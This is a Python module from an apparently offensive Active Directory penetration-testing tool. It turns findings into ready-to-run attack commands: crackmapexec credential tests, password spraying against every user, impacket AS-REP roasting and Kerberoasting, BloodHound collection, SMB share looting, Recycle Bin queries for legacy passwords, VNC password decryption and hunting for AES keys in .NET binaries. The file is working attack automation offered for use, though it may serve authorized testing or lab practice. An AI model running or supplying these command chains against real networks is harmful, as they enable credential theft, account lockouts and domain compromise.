"""
Trigger Rules for BloodTrail Recommendation Engine.

Pattern matching rules that map findings to recommendations.
Each rule specifies:
- Match conditions (finding type, patterns, etc.)
- Actions to take (auto-decode, recommend, etc.)
"""

import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Callable

from .models import (
    Finding,
    FindingType,
    Recommendation,
    RecommendationPriority,
    Credential,
    CredentialType,
)
from .decoders import decode_value, decrypt_vnc_password, looks_like_password


@dataclass
class TriggerAction:
    """An action to take when a trigger matches."""
    action_type: str  # "auto_decode", "recommend", "auto_check", "extract"
    params: Dict[str, Any] = field(default_factory=dict)


@dataclass
class TriggerRule:
    """
    A rule that matches findings and produces recommendations.

    Example:
        TriggerRule(
            id="custom_ldap_pwd_attr",
            match_type=FindingType.LDAP_ATTRIBUTE,
            match_pattern=r".*(pwd|pass|cred|secret).*",
            exclude_pattern=r"(badPwdCount|pwdLastSet)",
            actions=[
                TriggerAction("auto_decode", {"decoders": ["base64", "hex"]}),
                TriggerAction("recommend", {
                    "priority": RecommendationPriority.CRITICAL,
                    "template": "test_credential",
                }),
            ],
        )
    """
    id: str
    match_type: FindingType
    match_pattern: Optional[str] = None     # Regex for target field
    exclude_pattern: Optional[str] = None   # Regex to exclude
    match_tags: List[str] = field(default_factory=list)  # Required tags
    exclude_tags: List[str] = field(default_factory=list)  # Exclusion tags
    match_metadata: Dict[str, Any] = field(default_factory=dict)
    description: str = ""
    actions: List[TriggerAction] = field(default_factory=list)


# ============================================================================
# RECOMMENDATION TEMPLATES
# ============================================================================

def create_test_credential_recommendation(
    finding: Finding,
    username: str,
    password: str,
    target: str,
    domain: Optional[str] = None,
) -> Recommendation:
    """Create recommendation to test a discovered credential."""
    domain_flag = f"-d {domain}" if domain else ""
    return Recommendation(
        id=f"test_cred_{finding.id}",
        priority=RecommendationPriority.CRITICAL,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description=f"Test decoded value as password for {username}",
        why=f"Custom attribute '{finding.target}' contained encoded value that decoded to a password-like string",
        command=f"crackmapexec smb {target} -u {username} -p '{password}' {domain_flag}".strip(),
        on_success=["enumerate_smb_shares", "check_winrm", "collect_bloodhound"],
        on_failure=["try_other_users", "mark_invalid"],
        metadata={
            "username": username,
            "password": password,
            "credential_type": "password",
        },
    )


def create_decrypt_vnc_recommendation(
    finding: Finding,
    encrypted_hex: str,
    target: str,
) -> Recommendation:
    """Create recommendation to decrypt VNC password."""
    inferred_user = finding.metadata.get("inferred_user")
    file_path = finding.metadata.get("file_path", finding.target)

    why = "VNC stores passwords encrypted with a known hardcoded DES key - this can be decrypted offline"
    if inferred_user:
        why = f"VNC registry found in {inferred_user}'s folder - password is likely theirs. " + why

    return Recommendation(
        id=f"decrypt_vnc_{finding.id}",
        priority=RecommendationPriority.CRITICAL,
        trigger_finding_id=finding.id,
        action_type="tool_use",
        description=f"Decrypt VNC password from {file_path}",
        why=why,
        command=None,  # Handled internally
        metadata={
            "encrypted_hex": encrypted_hex,
            "decrypt_type": "vnc_des",
            "inferred_user": inferred_user,
            "file_path": file_path,
        },
    )


def create_smb_enum_recommendation(
    finding: Finding,
    target: str,
    username: str,
    password: str,
    domain: Optional[str] = None,
) -> Recommendation:
    """Create recommendation to enumerate SMB shares."""
    domain_flag = f"-d {domain}" if domain else ""
    return Recommendation(
        id=f"smb_enum_{finding.id}",
        priority=RecommendationPriority.HIGH,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description=f"Enumerate SMB shares with credential for {username}",
        why="Valid credential found - enumerate accessible shares for sensitive files",
        command=f"smbmap -H {target} -u {username} -p '{password}' {domain_flag}".strip(),
        on_success=["crawl_shares"],
        metadata={
            "username": username,
            "password": password,
        },
    )


def create_winrm_check_recommendation(
    finding: Finding,
    target: str,
    username: str,
    password: str,
    domain: Optional[str] = None,
) -> Recommendation:
    """Create recommendation to check WinRM access."""
    domain_flag = f"-d {domain}" if domain else ""
    return Recommendation(
        id=f"winrm_check_{finding.id}",
        priority=RecommendationPriority.HIGH,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description=f"Check WinRM access for {username}",
        why="WinRM provides remote shell access - check if credential grants this",
        command=f"crackmapexec winrm {target} -u {username} -p '{password}' {domain_flag}".strip(),
        metadata={
            "username": username,
            "password": password,
        },
    )


def create_bloodhound_recommendation(
    finding: Finding,
    target: str,
    username: str,
    password: str,
    domain: str,
) -> Recommendation:
    """Create recommendation to collect BloodHound data."""
    return Recommendation(
        id=f"bloodhound_{finding.id}",
        priority=RecommendationPriority.HIGH,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description="Collect BloodHound data with valid credential",
        why="BloodHound reveals attack paths - with valid creds we can map the entire domain",
        command=f"bloodhound-python -d {domain} -u {username} -p '{password}' -ns {target} -c all",
        metadata={
            "collection_method": "bloodhound-python",
        },
    )


def create_sqlite_hunt_recommendation(
    finding: Finding,
    file_path: str,
    target: str,
) -> Recommendation:
    """Create recommendation to hunt credentials in SQLite database."""
    file_name = finding.metadata.get("file_name", file_path.split('/')[-1])
    share = finding.metadata.get("share", "")

    # Build download command if it's a remote file
    download_cmd = None
    if share:
        download_cmd = f"smbclient //{target}/{share} -c 'get {file_path}'"

    return Recommendation(
        id=f"sqlite_hunt_{finding.id}",
        priority=RecommendationPriority.HIGH,  # Elevated - databases often have creds
        trigger_finding_id=finding.id,
        action_type="manual_step",
        description=f"Search SQLite database '{file_name}' for credentials",
        why="SQLite databases often contain application credentials - check for user/password tables",
        command=f"sqlite3 '{file_name}' '.tables' && sqlite3 '{file_name}' 'SELECT * FROM users LIMIT 5;'",
        on_success=["extract_sqlite_creds"],
        metadata={
            "file_path": file_path,
            "file_name": file_name,
            "download_cmd": download_cmd,
            "hunt_tables": ["users", "accounts", "credentials", "passwords", "auth", "ldap", "login"],
            "hunt_columns": ["password", "pwd", "pass", "secret", "hash", "cred"],
        },
    )


def create_test_vnc_credential_recommendation(
    finding: Finding,
    decrypted_password: str,
    inferred_user: str,
    target: str,
    domain: Optional[str] = None,
) -> Recommendation:
    """Create recommendation to test decrypted VNC password."""
    domain_flag = f"-d {domain}" if domain else ""
    return Recommendation(
        id=f"test_vnc_cred_{finding.id}",
        priority=RecommendationPriority.CRITICAL,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description=f"Test decrypted VNC password for {inferred_user}",
        why=f"VNC password was in {inferred_user}'s folder - this is likely their password",
        command=f"crackmapexec smb {target} -u {inferred_user} -p '{decrypted_password}' {domain_flag}".strip(),
        on_success=["enumerate_smb_shares", "check_winrm"],
        metadata={
            "username": inferred_user,
            "password": decrypted_password,
            "credential_type": "vnc_decrypted",
        },
    )


def create_decrypt_sqlite_credential_recommendation(
    finding: Finding,
    target: str,
    username: str,
    encrypted_value: str,
    encryption_type: str,
    table_name: str,
) -> Recommendation:
    """Create recommendation to decrypt AES-encrypted SQLite credential."""
    return Recommendation(
        id=f"decrypt_sqlite_{finding.id}",
        priority=RecommendationPriority.CRITICAL,
        trigger_finding_id=finding.id,
        action_type="manual_step",
        description=f"Decrypt {encryption_type} password for {username} from {table_name}",
        why=(
            f"SQLite database contains encrypted credential for '{username}'. "
            f"Look for decryption key in .NET assemblies (search for AesManaged, RijndaelManaged) "
            f"or config files in same directory."
        ),
        command=None,  # Manual investigation needed
        metadata={
            "username": username,
            "encrypted_value": encrypted_value,
            "encryption_type": encryption_type,
            "table_name": table_name,
            "hunt_locations": [
                "Same directory as database for .exe/.dll files",
                "App.config, web.config in application folder",
                "Registry keys for application settings",
            ],
        },
    )


def create_test_sqlite_credential_recommendation(
    finding: Finding,
    target: str,
    username: str,
    password: str,
    domain: Optional[str] = None,
    source_table: Optional[str] = None,
) -> Recommendation:
    """Create recommendation to test a credential extracted from SQLite."""
    domain_flag = f"-d {domain}" if domain else ""
    why = f"Credential extracted from SQLite database table '{source_table}'" if source_table else "Credential extracted from SQLite database"
    return Recommendation(
        id=f"test_sqlite_cred_{finding.id}",
        priority=RecommendationPriority.CRITICAL,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description=f"Test SQLite credential for {username}",
        why=why,
        command=f"crackmapexec smb {target} -u {username} -p '{password}' {domain_flag}".strip(),
        on_success=["enumerate_smb_shares", "check_winrm"],
        metadata={
            "username": username,
            "password": password,
            "source": "sqlite",
            "source_table": source_table,
        },
    )


def create_find_encryption_key_recommendation(
    finding: Finding,
    encrypted_value: str,
    username: str,
    target: str,
) -> Recommendation:
    """Recommend extracting AES key from .NET assembly for encrypted SQLite credential."""
    return Recommendation(
        id=f"find_key_{finding.id}",
        priority=RecommendationPriority.CRITICAL,
        trigger_finding_id=finding.id,
        action_type="manual_step",
        description=f"Find AES key to decrypt {username}'s password",
        why=(
            f"SQLite contains AES-encrypted password for '{username}'. "
            "Look for .NET assemblies (.exe/.dll) in the same location. "
            "Use 'strings -e l <file>.exe' or dnSpy to find 'Key =' and 'IV =' values."
        ),
        command=None,
        metadata={
            "encrypted_value": encrypted_value,
            "username": username,
            "search_hints": [
                "strings -e l <file>.exe | grep -i key",
                "strings -e l <file>.exe | grep -i 'iv'",
                "dnSpy/ILSpy: Search for AesManaged, CreateEncryptor",
            ],
        },
    )


def create_smb_crawl_recommendation(
    finding: Finding,
    target: str,
    username: str,
    password: str,
    domain: Optional[str] = None,
) -> Recommendation:
    """Create recommendation to deep crawl SMB shares."""
    return Recommendation(
        id=f"smb_crawl_{finding.id}",
        priority=RecommendationPriority.HIGH,
        trigger_finding_id=finding.id,
        action_type="tool_use",
        description=f"Deep crawl SMB shares as {username}",
        why="Search for VNC files, SQLite databases, config files, and .NET assemblies with credentials",
        command=None,  # Handled internally by orchestrator
        on_success=["process_vnc_files", "process_sqlite_files", "process_config_files"],
        metadata={
            "tool": "smb_crawler",
            "username": username,
            "password": password,
            "domain": domain,
        },
    )


def create_recycle_bin_recommendation(
    finding: Finding,
    target: str,
    username: str,
    password: str,
    domain: str,
) -> Recommendation:
    """Create recommendation to query AD Recycle Bin."""
    base_dn = ','.join([f"DC={p}" for p in domain.lower().split('.')])
    return Recommendation(
        id=f"recycle_bin_{finding.id}",
        priority=RecommendationPriority.CRITICAL,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description="Query AD Recycle Bin for deleted objects with credentials",
        why=f"User is member of AD Recycle Bin group - can read deleted objects which may contain legacy passwords",
        command=(
            f"ldapsearch -x -H ldap://{target} -D '{username}@{domain}' -w '{password}' "
            f"-b 'CN=Deleted Objects,{base_dn}' "
            f"'(objectClass=user)' cascadeLegacyPwd sAMAccountName"
        ),
        metadata={
            "query_type": "deleted_objects",
            "target_attribute": "cascadeLegacyPwd",
        },
    )


def create_password_spray_recommendation(
    finding: Finding,
    target: str,
    password: str,
    domain: Optional[str] = None,
    user_file: Optional[str] = None,
    source_description: Optional[str] = None,
) -> Recommendation:
    """
    Create recommendation to spray a discovered password against user list.

    This is triggered when a default/shared password is found (e.g., from HR notice,
    documentation, config files) and should be tested against all discovered users.
    """
    domain_flag = f"-d {domain}" if domain else ""
    user_file = user_file or "users_real.txt"

    why = source_description or f"Password extracted from {finding.target}"
    why += " - default/shared passwords are often still in use by multiple accounts"

    return Recommendation(
        id=f"password_spray_{finding.id}",
        priority=RecommendationPriority.CRITICAL,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description=f"Password spray '{password[:3]}...' against all users",
        why=why,
        command=f"crackmapexec smb {target} -u {user_file} -p '{password}' {domain_flag} --continue-on-success".strip(),
        on_success=["validate_hits", "enumerate_with_creds"],
        on_failure=["try_variations"],
        metadata={
            "password": password,
            "spray_type": "discovered_default",
            "user_file": user_file,
        },
    )


def create_asrep_roast_recommendation(
    finding: Finding,
    target: str,
    username: str,
    domain: str,
) -> Recommendation:
    """Create recommendation for AS-REP roasting."""
    return Recommendation(
        id=f"asrep_{finding.id}",
        priority=RecommendationPriority.HIGH,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description=f"AS-REP roast user {username} (no pre-auth required)",
        why="User has 'Do not require Kerberos preauthentication' - can request encrypted TGT offline",
        command=f"impacket-GetNPUsers {domain}/{username} -no-pass -dc-ip {target} -format hashcat",
        on_success=["crack_hash"],
        metadata={
            "attack_type": "asrep_roast",
            "username": username,
        },
    )


def create_kerberoast_recommendation(
    finding: Finding,
    target: str,
    username: str,
    password: str,
    domain: str,
    spn_user: str,
) -> Recommendation:
    """Create recommendation for Kerberoasting."""
    return Recommendation(
        id=f"kerberoast_{finding.id}_{spn_user}",
        priority=RecommendationPriority.HIGH,
        trigger_finding_id=finding.id,
        action_type="run_command",
        description=f"Kerberoast user {spn_user} (has SPN)",
        why="User has Service Principal Name - can request service ticket and crack offline",
        command=(
            f"impacket-GetUserSPNs {domain}/{username}:{password} "
            f"-dc-ip {target} -request-user {spn_user} -outputfile kerberoast.txt"
        ),
        on_success=["crack_hash"],
        metadata={
            "attack_type": "kerberoast",
            "spn_user": spn_user,
        },
    )


# ============================================================================
# BUILT-IN TRIGGER RULES
# ============================================================================

# Standard LDAP attributes to exclude from password hunting
STANDARD_PWD_ATTRS = [
    "badPwdCount", "badPasswordTime", "pwdLastSet", "pwdHistoryLength",
    "minPwdLength", "minPwdAge", "maxPwdAge", "lockoutDuration",
]


def _is_custom_pwd_attribute(attr_name: str) -> bool:
    """Check if attribute name suggests a custom password field."""
    if attr_name.lower() in [a.lower() for a in STANDARD_PWD_ATTRS]:
        return False
    pwd_patterns = [
        r".*pwd.*", r".*pass.*", r".*cred.*", r".*secret.*",
        r".*key.*", r".*auth.*", r".*token.*",
    ]
    for pattern in pwd_patterns:
        if re.match(pattern, attr_name, re.IGNORECASE):
            return True
    return False


# Define built-in trigger rules
TRIGGER_RULES: List[TriggerRule] = [
    # Custom LDAP attribute with password-like name
    TriggerRule(
        id="custom_ldap_pwd_attr",
        match_type=FindingType.LDAP_ATTRIBUTE,
        match_pattern=r".*(pwd|pass|cred|secret|key).*",
        exclude_pattern=r"(badPwdCount|pwdLastSet|minPwd|maxPwd|lockout)",
        description="Custom LDAP attribute that may contain a password",
        actions=[
            TriggerAction("auto_decode", {"decoders": ["base64", "hex"]}),
            TriggerAction("recommend", {
                "template": "test_credential",
                "priority": RecommendationPriority.CRITICAL,
            }),
        ],
    ),

    # VNC registry file
    TriggerRule(
        id="vnc_registry_file",
        match_type=FindingType.FILE,
        match_pattern=r".*vnc.*\.reg$",
        description="VNC registry backup file (may contain encrypted password)",
        actions=[
            TriggerAction("extract", {"extractor": "vnc_password_from_reg"}),
            TriggerAction("recommend", {
                "template": "decrypt_vnc",
                "priority": RecommendationPriority.CRITICAL,
            }),
        ],
    ),

    # SQLite database
    TriggerRule(
        id="sqlite_database",
        match_type=FindingType.FILE,
        match_pattern=r".*\.(db|sqlite|sqlite3)$",
        description="SQLite database file (may contain credentials)",
        actions=[
            TriggerAction("recommend", {
                "template": "hunt_sqlite_creds",
                "priority": RecommendationPriority.MEDIUM,
            }),
        ],
    ),

    # AD Recycle Bin group membership
    TriggerRule(
        id="ad_recycle_bin_member",
        match_type=FindingType.GROUP_MEMBERSHIP,
        match_pattern=r".*recycle.*bin.*",
        description="User can read AD Recycle Bin (deleted objects may have passwords)",
        actions=[
            TriggerAction("recommend", {
                "template": "query_recycle_bin",
                "priority": RecommendationPriority.CRITICAL,
            }),
        ],
    ),

    # AS-REP roastable user
    TriggerRule(
        id="asrep_roastable",
        match_type=FindingType.USER_FLAG,
        match_tags=["DONT_REQ_PREAUTH"],
        description="User does not require Kerberos pre-authentication",
        actions=[
            TriggerAction("recommend", {
                "template": "asrep_roast",
                "priority": RecommendationPriority.HIGH,
            }),
        ],
    ),

    # Kerberoastable user (has SPN)
    TriggerRule(
        id="kerberoastable_user",
        match_type=FindingType.USER_FLAG,
        match_tags=["HAS_SPN"],
        description="User has Service Principal Name (kerberoastable)",
        actions=[
            TriggerAction("recommend", {
                "template": "kerberoast",
                "priority": RecommendationPriority.HIGH,
            }),
        ],
    ),

    # Validated credential
    TriggerRule(
        id="valid_credential",
        match_type=FindingType.CREDENTIAL,
        match_tags=["validated"],
        description="Valid credential discovered",
        actions=[
            TriggerAction("recommend", {
                "template": "smb_enum",
                "priority": RecommendationPriority.HIGH,
            }),
            TriggerAction("recommend", {
                "template": "winrm_check",
                "priority": RecommendationPriority.HIGH,
            }),
            TriggerAction("recommend", {
                "template": "bloodhound",
                "priority": RecommendationPriority.HIGH,
            }),
            TriggerAction("recommend", {
                "template": "smb_crawl",
                "priority": RecommendationPriority.HIGH,
            }),
        ],
    ),

    # User with PASSWD_NOTREQD
    TriggerRule(
        id="passwd_not_required",
        match_type=FindingType.USER_FLAG,
        match_tags=["PASSWD_NOTREQD"],
        description="User account doesn't require password (may have blank password)",
        actions=[
            TriggerAction("recommend", {
                "template": "test_blank_password",
                "priority": RecommendationPriority.HIGH,
            }),
        ],
    ),

    # .NET executable/DLL in share
    TriggerRule(
        id="dotnet_binary",
        match_type=FindingType.FILE,
        match_pattern=r".*\.(exe|dll)$",
        match_tags=["dotnet"],
        description=".NET binary (may contain hardcoded credentials)",
        actions=[
            TriggerAction("recommend", {
                "template": "decompile_dotnet",
                "priority": RecommendationPriority.MEDIUM,
            }),
        ],
    ),

    # Config/INI files
    TriggerRule(
        id="config_file",
        match_type=FindingType.FILE,
        match_pattern=r".*\.(ini|conf|config|cfg|xml)$",
        description="Configuration file (may contain credentials)",
        actions=[
            TriggerAction("recommend", {
                "template": "search_config_creds",
                "priority": RecommendationPriority.MEDIUM,
            }),
        ],
    ),

    # Encrypted SQLite credential (needs key extraction)
    TriggerRule(
        id="encrypted_sqlite_credential",
        match_type=FindingType.CREDENTIAL,
        match_tags=["encrypted"],
        description="Encrypted credential from SQLite needs key extraction",
        actions=[
            TriggerAction("recommend", {
                "template": "find_encryption_key",
                "priority": RecommendationPriority.CRITICAL,
            }),
        ],
    ),

    # Discovered default/shared password (from text files, HR notices, etc.)
    # Triggers password spray recommendation
    TriggerRule(
        id="discovered_default_password",
        match_type=FindingType.CREDENTIAL,
        match_tags=["default_password"],
        description="Default/shared password found in documentation - spray against all users",
        actions=[
            TriggerAction("recommend", {
                "template": "password_spray",
                "priority": RecommendationPriority.CRITICAL,
            }),
        ],
    ),

    # Password extracted from file (generic - for SMB crawl discoveries)
    TriggerRule(
        id="file_extracted_password",
        match_type=FindingType.CREDENTIAL,
        match_tags=["from_file", "plaintext"],
        exclude_tags=["validated"],  # Don't spray if already validated
        description="Plaintext password extracted from file - try spraying",
        actions=[
            TriggerAction("recommend", {
                "template": "password_spray",
                "priority": RecommendationPriority.HIGH,
            }),
        ],
    ),
]


def match_finding(finding: Finding, rule: TriggerRule) -> bool:
    """
    Check if a finding matches a trigger rule.

    Returns True if:
    - Finding type matches rule type
    - Pattern matches (if specified)
    - Exclude pattern doesn't match (if specified)
    - Required tags are present (if specified)
    - Excluded tags are absent (if specified)
    """
    # Type must match
    if finding.finding_type != rule.match_type:
        return False

    # Check pattern match on target
    if rule.match_pattern:
        if not re.match(rule.match_pattern, finding.target, re.IGNORECASE):
            return False

    # Check exclude pattern
    if rule.exclude_pattern:
        if re.match(rule.exclude_pattern, finding.target, re.IGNORECASE):
            return False

    # Check required tags
    if rule.match_tags:
        if not all(tag in finding.tags for tag in rule.match_tags):
            return False

    # Check excluded tags
    if rule.exclude_tags:
        if any(tag in finding.tags for tag in rule.exclude_tags):
            return False

    # Check metadata requirements
    for key, expected in rule.match_metadata.items():
        if key not in finding.metadata:
            return False
        if finding.metadata[key] != expected:
            return False

    return True


def get_recommendations_for_finding(
    finding: Finding,
    target: str,
    domain: Optional[str] = None,
    username: Optional[str] = None,
    password: Optional[str] = None,
    rules: Optional[List[TriggerRule]] = None,
) -> List[Recommendation]:
    """
    Get recommendations for a finding based on trigger rules.

    Args:
        finding: The finding to process
        target: Target IP/hostname
        domain: Domain name (if known)
        username: Current user (if authenticated)
        password: Current password (if authenticated)
        rules: Custom rules (defaults to TRIGGER_RULES)

    Returns:
        List of recommendations generated by matching rules
    """
    if rules is None:
        rules = TRIGGER_RULES

    recommendations = []

    for rule in rules:
        if not match_finding(finding, rule):
            continue

        for action in rule.actions:
            rec = _process_action(
                action, finding, target, domain, username, password
            )
            if rec:
                recommendations.append(rec)

    return recommendations


def _process_action(
    action: TriggerAction,
    finding: Finding,
    target: str,
    domain: Optional[str],
    username: Optional[str],
    password: Optional[str],
) -> Optional[Recommendation]:
    """Process a trigger action and return recommendation if applicable."""

    if action.action_type == "auto_decode":
        # Auto-decode the raw value
        result = decode_value(str(finding.raw_value))
        if result.success:
            finding.decoded_value = result.decoded
            finding.decode_method = result.method.name if result.method else None
            finding.add_tag("decoded")
            if looks_like_password(result.decoded):
                finding.add_tag("likely_password")

    elif action.action_type == "recommend":
        template = action.params.get("template", "")
        priority = action.params.get("priority", RecommendationPriority.MEDIUM)

        # Get username from finding metadata or parameter
        target_user = finding.metadata.get("username", username)
        pwd = finding.decoded_value or str(finding.raw_value)

        if template == "test_credential" and target_user:
            return create_test_credential_recommendation(
                finding, target_user, pwd, target, domain
            )
        elif template == "decrypt_vnc":
            encrypted = finding.metadata.get("encrypted_hex", str(finding.raw_value))
            return create_decrypt_vnc_recommendation(finding, encrypted, target)
        elif template == "hunt_sqlite_creds":
            return create_sqlite_hunt_recommendation(finding, finding.target, target)
        elif template == "query_recycle_bin" and username and password and domain:
            return create_recycle_bin_recommendation(
                finding, target, username, password, domain
            )
        elif template == "smb_enum" and username and password:
            return create_smb_enum_recommendation(
                finding, target, username, password, domain
            )
        elif template == "winrm_check" and username and password:
            return create_winrm_check_recommendation(
                finding, target, username, password, domain
            )
        elif template == "bloodhound" and username and password and domain:
            return create_bloodhound_recommendation(
                finding, target, username, password, domain
            )
        elif template == "asrep_roast" and domain:
            target_user = finding.metadata.get("username", finding.target)
            return create_asrep_roast_recommendation(
                finding, target, target_user, domain
            )
        elif template == "kerberoast" and username and password and domain:
            spn_user = finding.metadata.get("spn_user", finding.target)
            return create_kerberoast_recommendation(
                finding, target, username, password, domain, spn_user
            )
        elif template == "smb_crawl" and username and password:
            return create_smb_crawl_recommendation(
                finding, target, username, password, domain
            )
        elif template == "find_encryption_key":
            encrypted = finding.metadata.get("encrypted_value", str(finding.raw_value))
            cred_user = finding.metadata.get("username", finding.target)
            return create_find_encryption_key_recommendation(
                finding, encrypted, cred_user, target
            )
        elif template == "password_spray":
            # Get password from finding metadata or decoded value
            spray_password = finding.metadata.get("password", finding.decoded_value or str(finding.raw_value))
            source_desc = finding.metadata.get("source_description", finding.metadata.get("notes"))
            user_file = finding.metadata.get("user_file")
            return create_password_spray_recommendation(
                finding, target, spray_password, domain, user_file, source_desc
            )

    return None
